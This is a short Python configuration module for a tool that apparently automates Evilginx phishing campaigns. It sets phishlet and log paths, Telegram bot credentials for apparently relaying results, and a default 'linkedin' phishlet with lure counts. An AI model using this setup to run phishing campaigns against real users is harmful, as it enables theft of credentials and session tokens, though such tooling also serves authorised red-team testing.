import os
from pathlib import Path
from pydantic import BaseSettings

class Settings(BaseSettings):
    # Evilginx paths
    evilginx_binary: Path = Path("/usr/local/bin/evilginx")
    phishlets_dir: Path = Path("/etc/evilginx/phishlets/")
    config_dir: Path = Path("/etc/evilginx/config/")
    log_dir: Path = Path("/var/log/evilginx/")
    
    # Telegram integration
    telegram_bot_token: str = os.getenv("TELEGRAM_BOT_TOKEN", "")
    telegram_chat_id: str = os.getenv("TELEGRAM_CHAT_ID", "")
    
    # Campaign settings
    default_phishlet: str = "linkedin"
    lure_count: int = 10
    campaign_timeout: int = 3600
    
    class Config:
        env_file = ".env"
        env_prefix = "EVILGINX_"

settings = Settings()
